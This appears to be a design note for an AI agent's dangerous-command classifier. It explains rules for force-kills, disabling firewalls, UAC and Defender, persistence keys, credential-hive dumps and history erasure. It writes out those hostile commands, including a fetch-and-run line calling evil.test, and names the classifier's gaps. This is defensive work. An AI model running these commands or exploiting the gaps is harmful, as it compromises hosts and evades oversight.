`kill -9 -1` was measured, safely: signal 0 delivers nothing and exists only to ask "can I signal this". `kill -0 -1` on this box exited 0, which proves `-1` is read as a PID and that it addresses processes this user can reach. A single `kill -9 <pid>` is NOT flagged, and the reason is worth a note. `trap 'kill $child' TERM` is in every shell script ever written. A rule that fires on the shape of that is a rule nobody can keep switched on. The `--` gets no special treatment, and that is a decision rather than an oversight. A mutation that stopped the read past it turned out to change nothing at all. `-1` is a PID and never a flag or a signal, so it is found wherever it sits. Code that cannot be told apart from its own deletion is not coverage. A `kill` with `-1` among its arguments returns `` `kill` sent to `-1`, which is every process the user owns ``.

`pkill`/`killall` are the analogue of the Windows `Stop-Process` rule. So the forced form is the one caught and the polite form (`pkill node`, a plain SIGTERM to a dev server) is not. `pkill` is not a binary on this box: `type -a pkill` reports a shell function installed by the wrapper this session runs under. That is the kind of thing worth a note rather than a guess. So the rule is written from the POSIX spelling and not from what this machine happens to have. The rule is `` `program` with an unignorable signal, which ends every process it names ``.

`systemctl`/`launchctl`/`service`: the line is survival across a reboot, in both directions. `stop`/`disable`/`mask`/`kill`/`unload`/`bootout` remove a unit that otherwise comes back. `enable`/`link`/`load`/`bootstrap` add one that starts with nobody there to ask. `restart` is neither: a service that comes back in five seconds is a disruption. `start` is the same, because it begins now and dies with the session unless something enabled it first. That is a different command with its own rule.

This half was absent, and the comment above used to claim otherwise. An earlier version of this doc said "the verbs that *persist* are caught" and listed only the removal verbs. That is true and beside the point. `systemctl enable` survives a reboot exactly as long as `systemctl disable` does, and it was `null` while the removal half was not. A test row pinned `launchctl load` as safe with the reason `"and loading, which adds"`. That phrase describes what a load does without an argument for why a new job is safe. What this costs: to enable a service you just built is ordinary work, and this rule fires on it. That is the same false positive the `restart` exemption avoids, and it is accepted here for the reason the removal half was accepted. The act outlives the session, so the person who approved the command is not the person who will live with it. A user who genuinely wants this can say so at the prompt.

`SERVICE_STOP_VERBS` (`packages/agent/src/dangerous-command.ts:2488`) holds `systemctl` with `stop`, `disable`, `mask` and `kill`, `launchctl` with `unload`, `disable` and `bootout`, and `service` with `stop`. `SERVICE_INSTALL_VERBS` (`packages/agent/src/dangerous-command.ts:2496`) holds `systemctl` with `enable` and `link`, and `launchctl` with `load`, `bootstrap` and `enable`. The second table is separate from the first rather than merged into it, because the rule message differs. "stops a service" is a lie for `enable`. The separation is also what lets a reader see that both halves exist. A single table hides the asymmetry that hid the gap. `link` registers a unit file that lives outside the search path, so it is an install spelled differently rather than a different act. `bootstrap` is the modern spelling of `load`, and the removal half already carries `bootout`, which is the modern spelling of `unload`.

Both loops skip tokens that start with `-` and compare the lower-cased token against the set. The stop message is `` `program token`, which stops a service ``. The install message is `` `program token`, which makes a service start at every boot, without anyone there to ask ``. A program that was found in the stop-verb table returns nothing after the two loops, before the branches below.

`SHUTDOWN` is Windows' program on this machine, and that is measured. `type -a shutdown` and `which -a shutdown` both return only `/c/Windows/system32/shutdown`, five entries that are all the same binary reached through differently-cased `PATH` elements. There is no `/usr/bin/shutdown` or `/bin/shutdown` at all. So the switches in `POSIX_SHUTDOWN_SWITCHES` (`packages/agent/src/dangerous-command.ts:2513`) are taken from POSIX, not from what the word does on this box. Windows' own `shutdown.exe` takes `/s`, `/r` and `/h` and treats `-r` as an ordinary argument. A table read off this machine is a table of the wrong program. The set holds `-h`, `-r`, `-p`, `--halt`, `--reboot` and `--poweroff`. `-c` is not in it and never can be, because it cancels a shutdown that has not happened yet. The two spellings are deliberately left in separate tables rather than merged into one that covers both platforms. That is a real loss of coverage on Windows, where `shutdown /s` powers the machine off and is not flagged. The classifier is told which platform's semantics to read, and this branch is the POSIX one. A `shutdown` with one of these switches returns "`shutdown`, which powers the machine off or restarts it".

`init 0` and `telinit 0` are the SysV spellings: the runlevel is the argument. 0 stops the machine and 6 restarts it, so the two need different words. The earlier version of this returned `"halts"` for both, a message that is wrong about half of what it catches. The rule itself is right, and what it catches is what the flag needs. Only the claim about what happens was wrong. `POWER_PROGRAMS` (`packages/agent/src/dangerous-command.ts:2506`) holds `reboot`, `halt` and `poweroff`. One of those returns "`program`, which powers the machine off or restarts it", with no way to argue.

### Host protections

`POSIX_PROTECTION_OFF` (`packages/agent/src/dangerous-command.ts:2517`) switches a host protection off. Nothing here was measured, and the comment says so rather than a copy of the Windows batch's text. `WINDOWS_ADMIN_VERBS` can say it was measured, because that measurement was possible. `command -v` on this box finds no `ufw`, `iptables`, `nft`, `setenforce` or `firewall-cmd`, so there was no spelling to check and no behavior to see. This is the weaker position and it is stated as such rather than dressed up. The rule is kept anyway, on the `wmic` precedent. "not installed here" is a fact about the machine the file was written on, not a reason to leave an act uncovered. These are among the most widely used administration commands on the platform, and the same act on Windows, `netsh advfirewall set`, is already flagged.

A program and a verb, not a program. `ufw status`, `iptables -L`, `nft list ruleset` and `setenforce` are how a person looks at the protections on a machine. A rule that fired on those is a rule nobody keeps switched on. So `disable` and `reset` are caught on `ufw` while `enable` and `status` are not. `iptables` is caught on the verbs that empty a table or open a default policy rather than on the program. A protection switched on is a repair and is left alone here. The reason is the same as for `firewallEnabledReading`, which reads `"on"` on Windows and the caller walks away from it. `iptables -A INPUT -p tcp --dport 8080 -j ACCEPT` is deliberately not a rule: one allow rule added is not the same act as an empty table. A rule broad enough to catch the narrow case catches every firewall rule anyone writes. `iptables -P INPUT ACCEPT` is caught, because it changes the default for every packet that no rule matches, the whole policy, in one switch.

The map holds `ufw` with `disable` and `reset`, `nft` with `flush`, `setenforce` with `0` and `permissive`, and `aa-disable` with an empty set. It also holds `firewall-cmd` with `--set-default-zone=trusted`.

`iptablesFlushesOrOpensPolicy` (`packages/agent/src/dangerous-command.ts:2527`) is separate from the table because `iptables` is not shaped like the rest of it: there is no verb word, only switches. `-F` and `--flush` empty a table, which is named or defaults to the filter table, and `-P <chain> ACCEPT` sets the default for a whole chain. `-A`/`-I` are absent on purpose, for the same reason: one rule added is ordinary firewall work. A rule broad enough to catch `-A INPUT ... -j ACCEPT` catches every rule anyone has ever written.

The two short switches here are matched case-sensitively, and this rule used to fold case. It did `tokens[i].toLowerCase()` and then compared against `"-f"` and `"-p"`. That caught the real `-F` and `-P` by accident, and it also caught two switches that mean something else entirely. The option table of iptables binds them the other way round. `iptables/iptables.c:84` is `{.name = "flush", .has_arg = 2, .val = 'F'}` and `:104` is `{.name = "fragments", .has_arg = 0, .val = 'f'}`, while `:89` is `{.name = "policy", .has_arg = 1, .val = 'P'}` and `:94` is `{.name = "protocol", .has_arg = 1, .val = 'p'}`. Both tables were read from two independent mirrors of the same tree, byte for byte the same. `getopt_long` is case-sensitive, so `iptables -A INPUT -f -j ACCEPT`, the ordinary `accept fragmented packets` rule, was reported as ``` `iptables` emptying a ruleset ```.

The `-p` half was worse than a false positive in the other direction. It made `--protocol`'s own spelling the one this rule looked for, and it fired only when `tokens[policy + 2]` was literally `accept`. No valid `iptables` spelling produces that without a `-j` between them. So `iptables -p tcp -P INPUT ACCEPT`, a real open of the policy, was missed, while `iptables -A INPUT -p tcp -j ACCEPT` was the only thing the entry saw. It was dead in the direction that mattered and live in the direction that did not. The function has no `toLowerCase()` on the `-F` check, with the comment that this is `wipefs -O`/`-o` all over again, for the same reason. It returns ``` `iptables` emptying a ruleset, which removes every rule that was filtering traffic ``` for `-F` or `--flush`. It returns ``` `iptables` setting a chain's default to ACCEPT, which lets through every packet no rule matches ``` for a `-P`/`--policy` whose second token after it lower-cases to `accept`. Only ACCEPT opens a policy. `DROP` and `REJECT` are the directions that tighten, and they belong to a rule that does not exist.

`posixProtectionRules` (`packages/agent/src/dangerous-command.ts:2551`) sends `iptables` and `ip6tables` to the helper. `aa-disable` takes no arguments at all, so it is matched on the program rather than through the verb loop. It returns "`aa-disable`, which turns AppArmor off". ### Windows: the persistence predicates

Seven pure predicates each read one string, such as a registry path or a value name that decides what Windows runs later. Another shape is a protection setting that decides how hard it is to run something now.

`isRunKeyPath` (`packages/agent/src/dangerous-command.ts:2924`) matches a path that ends in `\CurrentVersion\Run` or `\CurrentVersion\RunOnce`, under either hive. `Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'` is true on this machine, so the key is where it has always been. `RunOnce` is the same idea for one boot. `isStartupFolderPath` (`packages/agent/src/dangerous-command.ts:2953`) is the filesystem counterpart. The match is on the `...\Startup` tail under `%APPDATA%` and under `$env:APPDATA`, because those are the spellings that arrive on a command line. The variable is not expanded here and must not be, because a rule that needs a resolved `C:\Users\someone\...` misses the form people type.

The boundary is `(\\|$)` and the difference is the whole rule. A copy into `...\Startup` names the folder, with no filename after it. So a pattern that needed a separator and then a name matched only the `...\Startup\evil.bat` form and returned `null` for the more common one. A longer spelling, `...\Start Menu\Programs\Startup`, was tried and removed. Every path that begins with it also ends in `\Startup`, so it was subsumed. The JSDoc of this function says `\b` is the wrong boundary "in the other direction". It says the boundary fires between the `p` and the `B` of `StartupBackup`, so a folder beside it is caught. The comment inside the function corrects that: `\b` matches word-to-non-word, and the `B` of `StartupBackup` is a word character. So `\startup\b` misses that folder beside it just the same. The two spellings agree on every path shape here, which is why no test can tell them apart. `(\\|$)` is kept because it states the intent, that the next segment must be a directory or nothing. The other spelling depends on a reader's recall of `\b` between two word characters.

The `/i` flag is belt-and-braces: the parameter is `lower`, so the whole Windows line was folded before this predicate runs. `Startup` already reads as `startup`. A mutation that removes the flag stays green. It is kept anyway, to match `isRunKeyPath` beside it, because a predicate that works only on pre-folded input is a trap for the next caller. The flag costs one character, against the cost of a reader who assumes the flag is essential when it is not.

`isUacValueName` (`packages/agent/src/dangerous-command.ts:2985`) is the value that decides whether the UAC prompt appears at all. The `[:.-]` at the front lets a parameter written the way PowerShell accepts it, `-Name:EnableLUA`, still be recognised. The `\b` keeps `EnableLUAOld` from a match against this value.

The function also reads the value that turns UAC off without a write to UAC. The switch that decides *how* an administrator is prompted is `ConsentPromptBehaviorAdmin`, and its default of `5` means "prompt with credentials". The value `0` means `"elevate without prompting"`, which is the setting a privilege-escalation payload writes. Measured on this machine: `Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'` reports `EnableLUA 1` and `ConsentPromptBehaviorAdmin 0`, so both spellings are live here. Two more values are the same act a step down. `0` on `PromptOnSecureDesktop` moves the prompt off the secure desktop, so a malicious window can pose as the consent dialog. `0` on `EnableInstallerDetection` stops any detection of installers at all. Both read `0` on this machine, which is the downgraded state and not the default.

This is a *value* test and it is always paired with `isUacPolicyKey`. So a parameter that merely mentions one of these names is not enough on its own.

`isUacPolicyKey` (`packages/agent/src/dangerous-command.ts:2994`) matches the `Policies\System` key itself. The boundary has to be the end of the path and not a word boundary. The `\` is a non-word character, so `\b` fires between `System` and the `\` after it, and `HKLM\Software\Policies\System\Other` then counted as the UAC key. That key is a different key underneath, and a write of `EnableLUA` there turns nothing on.

Measured over the three shapes that tell the two apart, in both spellings of the same key (PowerShell's `HKLM:\` and CMD's `HKLM\`). `...\Policies\System` matches, `...\Policies\System\Other` does not, and `...\Policies\SystemOther` does not. The last shape is what rules out a plain `includes`, because `Policies\System` sits inside `SystemOther` and the keys differ.

`isDefenderPolicyKey` (`packages/agent/src/dangerous-command.ts:3000`) matches the two Windows Defender policy keys that hold a protection switch. Both keys and all four of their values were enumerated on this machine by a read-only walk of the `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` subtree. The subtree holds exactly two keys. `Real-Time Protection` holds exactly one value, `DisableRealtimeMonitoring`. `SmartScreen` holds exactly three: `EnableSmartScreen`, `ConfigureAppInstallControl` and `ConfigureAppInstallControlEnabled`. A third key one may expect, `Exclusions`, does not exist here, because the exclusions Defender adds at runtime are not written to the policy hive. So a rule that named it is a rule for a key this machine never had.

That enumeration is what makes the key the rule rather than the value name, unlike the UAC row. The four values are all switches that turn a protection down, so a rule that named each one is four chances to forget the fifth. This is a measured fact about these two keys and not a claim about the subtree in general.

The end-of-path boundary is the same one `isUacPolicyKey` uses, for the same reason. `...\Windows Defender\Real-Time Protection\Backup` is a different key underneath, and `\b` cannot tell them apart because `\` is not a word character.

Only a key that arrives as one token matches, and that is not a gap. Both key names have a space, so the unquoted spelling splits in the shell. Measured, not assumed: `reg query` on the unquoted form answers `ERROR: Invalid syntax.` and writes nothing. The second word lands where the grammar has no positional to put it. `reg add` takes the same `KeyName` positional at the front (`REG ADD KeyName [/v ValueName …]`), so the unquoted form of the dangerous command fails the same way. Quoted, which is the only spelling that runs at all, the key arrives whole and matches. The comment records this because "the unquoted form does not match" otherwise reads as a hole on the next read, and it is the opposite.

`isServiceStartValue` (`packages/agent/src/dangerous-command.ts:3006`) matches the `Start` value of a service key. `sc config <name> start= disabled` is already a rule elsewhere in the file, and a write of `Start` under `HKLM\SYSTEM\CurrentControlSet\Services\<name>` is the same act in the registry spelling. To leave the second one out makes the coverage depend on which shell is used, the same argument the `EnableLUA` row makes.

The match is on the value name alone, because any service can be disabled this way. The question that matters is which one, not what the value is called. `WinDefend` is the one this build cares about most. Its own `Start` is `0x3`, the normal demand start, so this rule is about the write and not the current setting. The pair was confirmed read-only: `reg query ...\Services\WinDefend /v Start` and `/v BFE /v Start` both answer with the value. A service name that does not exist answers `ERROR: The system was unable to find the specified registry key or value.` instead. The other route to that same number is a Defender policy key.

The `/i` is measured and not stylistic: registry value names are case-insensitive, and `reg query ... /v start` returns the same `0x3` as `/v Start`. `StartX` does not resolve, so the `$` boundary does the work that the `X` proves.

No backslash tolerance at the front here, on purpose. An earlier version of this predicate stripped a `\` from the front of the value name and so fired on `reg add ... /v \Start`. Measured: `reg query ... /v \Start` answers not found where `/v Start` answers with the value, because the backslash is part of the name. So `/v \Start` writes a second, inert value and changes no service's start mode. The rule then cries wolf on a command with no effect, in exchange for a spelling nobody types. It was removed rather than kept as defensive reach, and the negative case is pinned by a test row.

`isCredentialHiveKey` (`packages/agent/src/dangerous-command.ts:3012`) matches the root of a registry hive that holds credentials. The three are the machine's own. `SAM` is the Security Account Manager's copy of every local account. `SYSTEM` carries the LSA secrets. `SECURITY` carries the policy, with cached domain logons and Kerberos keys among it. `reg save` or `reg export` pointed at one of them writes a copy to a path the person chooses. A copy of it on a filesystem is not protected by anything the account's ACL normally enforces.

Both path spellings are real: `reg save HKLM\SAM ...` from CMD, and the same line in a PowerShell prompt. There, the argument is just as often written `HKLM:\SAM` because that is the provider path the rest of the session uses. There is no PowerShell *cmdlet* for this, which `Get-Command Save-Hive` settles: it fails with `CommandNotFoundException`, while `Get-Command reg` resolves it as an Application. So the CMD spelling is not one of two doors here but the only one. The two path spellings are the whole of what had to be read.

The `$` at the end is the boundary of `isUacPolicyKey`, and it is essential here for the same reason. `\b` gets one of the two adjacent shapes right and the other wrong. It does not fire between the `m` of `SAM` and the `E` of `SAMPLES`, so a key with that name is correctly rejected. But it does fire between the `m` of `SAM` and the `\` of `\Domains`, so a child key reads as the hive. `isRunKeyPath` *wants* that shape, because it matches a Run key or anything under it.

Here a child is a different and much larger thing. `HKLM\SYSTEM` holds the machine's credentials, and `HKLM\SYSTEM\CurrentControlSet` holds its hardware and service configuration, which `reg save` is asked to copy as a matter of routine. A rule that matched that fires on an ordinary system image.

So the children are matched by where the credentials are, and not because they are children. `SAM` and `SECURITY` hold nothing but account material, so everything under either is a credential dump. `SYSTEM` holds both, so only the one subtree that is credentials, `Control\Lsa`, is matched there. That subtree is where the LSA secrets and the cached domain logon keys live. The rest of the hive stays allowed for the backup work. A backslash on both sides of a child name keeps `SAMPLES\Anything` and `SECURITYX` out of the `SAM` and `SECURITY` rows. The `$` does that job for a hive, and this does it for a child.

`HKLM\SAM\Domains` and `HKLM\SYSTEM\Control\Lsa\Secrets` were real credential stores this used not to catch, and the comment used to call the set open-ended and better left alone. It was not open-ended. The two hives that are entirely credentials, and the one subtree of the third that is, are a closed list. The list costs three patterns rather than a judgement call about how much is too much.

The `ControlSet` alternation in the LSA pattern is optional and has two spellings, because three names reach the same store. They are the bare `SYSTEM\Control\Lsa`, the symbolic `SYSTEM\CurrentControlSet\Control\Lsa`, and the live `SYSTEM\ControlSet001\Control\Lsa` underneath it. A `reg save` typed by a person, or written by a backup tool, can carry any of the three. A pattern that took only the bare form catches the name a document uses and misses the one a machine has. The optional group is also what keeps `SYSTEM\ControlSet001` on its own out of the rule. A copy of a control set is routine, and only the `Lsa` below it holds credentials.

This predicate was not measured, and the reason is the point of the rule. Every way to check whether these keys exist is `reg query` or `Test-Path` against them, which enumerates the very stores the predicate flags. That is a fact about this machine's session and not a claim that the names are uncertain. `SAM`, `SYSTEM` and `SECURITY` are the hive names Windows prints in the `HKEY_LOCAL_MACHINE` list, and `Control\Lsa\Secrets` is where the LSA cache is documented to live.

### Windows: CMD builtins and direct launches

`CMD_BODY_SWITCHES` (`packages/agent/src/dangerous-command.ts:3163`) holds `/c`, `/k`, `/r` and `-c`, the switches that open a CMD body. `/k` is here beside `/c` and not after it, and the difference is worth a sentence because it is not a superset. `/k` does not run the body and leave. It runs the body and then leaves a prompt open, so everything `/c` runs, `/k` runs first.

`dangerousCmd` (`packages/agent/src/dangerous-command.ts:3165`) reads a `cmd` line. The depth bound is the same one the wrappers use, because a body of `cmd`s is the same shape one level down. Measured: `cmd /c cmd /c rd /s /q C:\x` and `cmd /c cmd /k rd /s /q C:\x` both deleted, and so did the quoted form `cmd /c "cmd /c rd /s /q C:\x"`. That rules out a second read of the same words and calls for re-entry. The body was already split, so the words that reach the re-entry are the ones the next shell sees.

The loop after the program name skips switches until it finds a body switch. An unrecognized word before the body ends the shape. So `cmd /x something` returns nothing, and the word after it is not read as a body. One switch does not end the switches. `cmd /k /c rd /s /q C:\x` runs the delete through the inner `/c` and then leaves a prompt open. So when a second switch comes between the one that was found and the body, the same body is one word later. Only these switches are skipped, so an unrecognized `/x` still falls through to the word after it and ends the shape.

The body of a `/c` arrives as one argument. A quoted `"Remove-Item C:\x -Force"` is a single token until it is split. Until it is split, every word rule sees one long word that matches nothing. This is the same move `powershellScript` makes for `-Command`, for the same reason. An unrecognized shape is read against the rules of every shell that may run it, never as "nothing here".

A body that opens with `cmd` is the shape this function never read before, because nothing below re-enters. `cmd /c cmd /c del /f C:\x` was read as the word `cmd` and stopped.

A body is not only builtins. `cmd /c "git clean -fdx"` and `cmd /c "docker system prune -a"` are ordinary ways to type the two commands those tables do not have. Both spell the `cmd` in front of the line, so that whatever launches it does not have to know what `git` is. The development rules are consulted last, so a builtin still gets to name itself. The reason they are consulted at all is the sentence before. A body is read against every shell that may run it, never as "nothing here".

The tail is the same five rules `matchWindows` runs, in the same order. It used to be three of them, and the two it dropped were the two the sentences above are about. A `cmd /c` body was read against the CMD builtins and the PowerShell words, and not against the Windows admin table or the GUI-launch rules. Every one of these went from a match to `null` on the same tokens at the tail, measured bare versus prefixed. `vssadmin delete shadows /all /quiet`, `wevtutil cl System`, `bcdedit /set {default} recoveryenabled no`, `cipher /w:C:\Users\bob`, `reg delete HKLM\SOFTWARE\Foo /f`, `sc config sshd start= disabled`, `netsh advfirewall set allprofiles state off`, `takeown /f C:\Windows\System32`, and `powershell -c IEX (iwr http://evil.test/a.ps1)`. `mshta` and `rd /s /q` survived both spellings, which is the evidence for the diagnosis rather than against it. They are caught by the two rules the tail did consult. That asymmetry is the shape of a dispatch entry that was not there.

The last row needed a second piece, the same one `matchWindows` puts at its top. A body that runs PowerShell is `cmd /c powershell -c IEX (...)`, and the eval cmdlet is not at the head until the `-c` body is expanded into words. Without the unwrap, `dangerousPowershellWords` is handed `powershell -c IEX …` and reads `powershell` as the head. That is a real command, not the one that runs, so it matches nothing.

`dangerousCmdBody` (`packages/agent/src/dangerous-command.ts:3224`) holds the builtins of a single shell. They are read wherever CMD may be the thing that runs them: after a `cmd /c`, and at the top level of a Windows line. That is what the line becomes once a tool hands it to `cmd.exe`. A chain spelled `cmd /c echo hi && rd /s /q C:\x` splits into two segments and only the first of them says `cmd`. The second is a CMD body all the same, and to read it as anything else is a miss. Neither rule fires without the flag that takes the question away: `rd /s` still prompts, and `rd /s /q` does not. A rule that cannot tell those apart cries wolf on the ordinary spelling of a recursive delete.

The words after the last `&` or `|` are a segment no separator ever closes. `cmd /c del /f C:\x` is nothing *but* that segment, so the tail is checked by a separate call. It used to be a sentinel word appended to the list, and the sentinel was a NUL byte. A NUL is a value no word can be, and it also makes the whole file binary. `file` reported `data`, and `grep` no longer listed lines from it. So the file the classifier lives in became the one file nobody can search. A separate call for the tail needs no such value to exist.

`dangerousCmdSegment` (`packages/agent/src/dangerous-command.ts:3240`) reads one segment. A `cmd /c` body arrives as a word array that the strips in `matchTokens` never touched. So a control word inside one is still at the head of its segment. Measured: `cmd /c if exist C:\x rd /s /q C:\y` and `cmd /c for /f %i in (x) do del /f C:\y` both ran the delete, and both were read as the word `if` and the word `for`. The same strip is applied here, by recursion.

`del /s /q` is `rd /s /q` under another program name: `/s` walks into subdirectories and `/q` suppresses the confirmation for each one. The row asks for both for that reason. `del` used to be gated on `/f` alone, so the silent recursive spelling matched only when `/f` happened to be there too. Measured `null` before the fix: `del /s /q C:\x\*`, `erase /s /q`, `del /q /s`, and the upper-case spelling. Both flags are still required together, because `del /q file.txt` is a quiet single delete and `del /s name` is a scoped one, and neither is a recursive wipe. The pair is checked before the `/f` row because it is strictly more specific. `del /s /q /f` is a silent recursive delete first and a forced delete second, and the message must name the act that destroys the most.

`hasCmdFlag` (`packages/agent/src/dangerous-command.ts:3270`) answers whether one token carries a switch, however the switch was spelled. It was measured on `dir`, which owns both `/s` and `/q`: `/s /q`, `/s/q` and `/q/s` all list the file, and `/z` answers `Invalid switch - "z"`. So CMD does let several single-letter switches share one token, each introduced by its own slash. An exact token comparison missed that: `rd /s/q C:\x` is a silent recursive delete and used to read as neither `/s` nor `/q`.

One test covers every real spelling, and the two that are not real are the two it rejects. Letters bundled with no slash: `/sq` answers `Invalid switch - "sq"`. A reader that treated it as `/s` plus `/q` classifies a command that cannot run, which is the wrong kind of right. A separator that is neither a slash nor a semicolon: `/s:1` answers a parameter-format error, and the file survives. That was measured on real `del` against a file that existed. An earlier version read "the switch, then anything that is not a letter or a digit", which let that spelling in. The comment above the branch claimed `/s:1` was real. It was not, and it was the only observable thing the branch did, because `/s`, `/s/q` and `/q/s` all pass the pieces test anyway.

Every piece must be one character, which is also what keeps a path from a fake switch. `/tmp/f` splits to `tmp` and `f`, `tmp` is not a switch, and `del /q /tmp/f` names a file in the current directory rather than a recursive delete. The semicolon separator, `dir /s;q` lists the file, measured, never reaches this function. `splitShellCommands` (`packages/agent/src/shell-tokens.ts:105`) cuts the command at the `;` first, because that is the separator it is on other platforms. The caller rejoins on it, as `rejoinedSwitchSegments` describes below. `verbMatches` answers the same question for the long verbs in `WINDOWS_ADMIN_VERBS`, where there are no letters to bundle. It is not a substitute for this one, nor this one for it.

`SCRIPT_URI_RE` (`packages/agent/src/dangerous-command.ts:3278`) holds the argument schemes that are *run* rather than *fetched*. `looksLikeUrl` accepts only `http:` and `https:`, which is the right rule for the launches above it. The point of those is to hand a URL to something that fetches or renders it. A `javascript:` or `vbscript:` argument is the other thing: there is no fetch, nothing to review, and the payload is the argument. `mshta javascript:alert(document.domain)` runs the text on the command line, which is why it is on this list.

The class at the front is not decoration. These reach the classifier glued to the punctuation PowerShell and CMD wrap a bareword in, such as whitespace, a quote, an open parenthesis or bracket. That is the same reason `URL_SHAPE_RE` starts where it does. A rule anchored on the first character misses the quoted spelling, which is the more common one. An unquoted `javascript:alert(1)` is a syntax error in CMD.

`data:text/html` is here for the same reason. It is the same handler reached by a document placed in the argument rather than by a scheme that runs it. The `data` spelling is split out and not part of the scheme group because the colon sits in the wrong place for it. `data:` is the scheme and `text/html` is the media type. So `(?:javascript|vbscript|data)\s*:` also matches a `data:` argument that carries a PNG, which `mshta` renders as an image and which is not code that runs. The type is part of that spelling rather than a suffix on the group.

`directGuiLaunch` (`packages/agent/src/dangerous-command.ts:3286`) reads a GUI app or protocol handler launched with a URL in its arguments: `explorer`, `mshta`, `rundll32` with `url.dll,FileProtocolHandler`, and the browser executables. `mshta` was measured as far as this machine allows. `mshta.exe` is 36864 bytes at `C:\Windows\System32\mshta.exe`, and its binary carries the string `RunHTMLApplication` and the COM class id `{25336920-03f9-11cf-8fd0-00aa00686f13}`. It is a shim whose whole job is to hand its argument to the HTML application host. That is why the rule fires on `mshta http://…` without a read of the document.

The scheme dispatch itself is **not** measured, and the reason is that `mshta` reports everything through a dialog. `mshta /?`, `mshta nosuchscheme://x` and `mshta vbscript:x` each wrote zero bytes to a redirected stdout and each exited 0. There is no observable difference between the three from a shell, so nothing here rests on a run of one. `rundll32` is here for the same reason and reads the same way. It was not measured either. `rundll32.exe` is 98304 bytes and its strings give up nothing about how it parses arguments, no switch names and no scheme table. So this rests on the program that hands its argument to a handler rather than on anything seen here.

`matchWindows` (`packages/agent/src/dangerous-command.ts:3370`) is the platform entry. There is no PowerShell parser here. A real parse of these constructs needs a tree-sitter grammar, and this repo has no equivalent. So the scan is over tokens rather than a walk of a parsed script body. A constructed cmdlet such as `& ("Remove-" + "Item") -Force` is invisible to it. That gap is a real limit and not a bug. It is why the engine treats a match as something to stop, and a non-match as only ever "nothing was recognized". It is never "this is safe".

The dispatch reads the PowerShell words first when the line opens with a PowerShell executable. It then reads both vocabularies against the line as it stands. A Windows line is a line for whichever shell the tool layer picks, and this function is not told which. Each rule is still its own shell's. A line that says `Remove-Item` and `-Force` is PowerShell's to run and PowerShell's to answer for. A line that says `del /f` is CMD's, whichever shell reads it in the end. What this cannot be is a way to run a line in a shell whose vocabulary is *neither*. No such vocabulary has these words in it. The order is `dangerousCmd`, `dangerousCmdBody`, `dangerousPowershellWords`, `directGuiLaunch`, `dangerousWindowsAdmin`.

`powershellWords` (`packages/agent/src/dangerous-command.ts:3356`) reads the argument words of a PowerShell invocation, with a script body opened up. The body of `-Command "…"` arrives as one token, correctly, since it is one argument. But every rule is a word rule, so a quoted script has to be read as the sequence of words it is. Only then can a cmdlet and a flag be found in the same segment. Only the body is expanded. Every other argument is left whole, because a quoted string that merely *mentions* `Remove-Item` is not a command. A classifier that reads it as one is one the user learns to dismiss.

`-EncodedCommand` is *not* expanded here, and that is a measured decision and not an oversight. `powershellScript` already reads an encoded body into the full rule set, which strictly includes the word rules here. The only inputs this function can add are ones where an earlier switch already claimed the script slot and the encoded body therefore never runs. ### Windows: the PowerShell admin cmdlets

`powershellAdminCmdletRules` (`packages/agent/src/dangerous-command.ts:3388`) reads the cmdlets whose switch-shaped twin is already a rule, plus the shapes that erase a PowerShell session's own record. Every cmdlet here does something the tool for the same act already does, so the reason column is the act and not the spelling. The history shapes are not cmdlets at all. POSIX has had `historyRules` for the same act, which is why this group exists next to it.

The redirect is checked on the *joined* text, before the segment split, because the split cannot see it. `>(Get-PSReadLineOption).HistorySavePath` is broken at the parentheses by `SOFT_SEPARATORS`, so by the time a segment exists the operator and its target are in different segments. Neither one names a history file on its own. To rejoin the words is enough, because the pieces are the pieces, `>`, `Get-PSReadLineOption` and `.HistorySavePath`, and the last two spell the path.

`isHistoryRedirect` (`packages/agent/src/dangerous-command.ts:3443`) reads two tokenizer forms. `> target` arrives as two tokens and is matched by position. `>target` arrives as one token with the operator glued to the front, so the operator is stripped and the remainder goes through `isShellHistoryPath`. `>>` counts too: an append is not an erase. But the rule cannot tell an append from a truncate without a read of the file. A redirect at the history file is worth a question either way. Only an operator at the front counts, so a token that merely has a `>` in the middle (`"a>b"`) is not a redirect target.

For each segment, the name is looked up in `POWERSHELL_ADMIN_CMDLETS` and the message names the act. `Set-NetFirewallProfile` is special because its parameter `-Enabled` reads as a *value* rather than a presence. Presence catches `-Enabled True`, which turns the firewall **on**. That is a repair rather than a weakness, and a rule that flags it is the kind that gets switched off. The value can be glued (`-Enabled:$false`), separate (`-Enabled False`) or absent, and each has to give the same answer. Absent means "use the current default", which may not be off. So absent is *not* treated as a value that disables, and the cmdlet-name rule covers that case instead. On a value of `off` the rule fires. On a value PowerShell will not accept (`-Enabled maybe`) it also fires, with a message that says the value will be rejected before anything changes. Nothing changed, the command is a typo, and what the user needs to know is that the line was aimed at this. On a value of `on` the cmdlet is left alone. The two other things it can change, `-DefaultInboundAction` and `-DefaultOutboundAction`, tighten policy as often as they loosen it. A rule there has to earn itself. An absent value falls through to the cmdlet-name rule, because "use the current default" is a change of nothing in particular. This file leaves it unflagged elsewhere.

That unreadable case is the point the two mirror booleans used to *disagree* on, and they lost the line. `isFirewallEnabledFalse` said in its own comment that a value PowerShell rejects is treated as off, `"guessing 'off' is the safe side"`. Ten lines away, `firewallEnabledTrue` said the same value is not a deliberate "on". Its comment gives the reason: "a typo means the command will not run at all, so there is no act to flag". Two comments, opposite conclusions, same input. Neither matched the code either: the first returned `false` for an unrecognized value and the second returned `true`, and the caller acted on the second. So `Set-NetFirewallProfile -Enabled maybe` left the classifier entirely, measured `null` while `-Enabled False` returned a match. A typo on the one command whose whole purpose is to turn the firewall off went unread. The code did the opposite of what both comments claimed.

`firewallEnabledReading` (`packages/agent/src/dangerous-command.ts:3461`) is the replacement: three readings, not two booleans. "I cannot read this" is not the same answer as either "on" or "off". To flatten it into one of them is precisely what dropped the line. The glued form is `-Enabled:$false`. The negated name on its own is `-NotEnabled`, read as off. The separate form needs a word after it that is not another parameter name. `readFirewallValue` (`packages/agent/src/dangerous-command.ts:3480`) maps the value through `POWERSHELL_FALSE_VALUES` to off, through `POWERSHELL_TRUE_VALUES` to on, and everything else to `unreadable`.

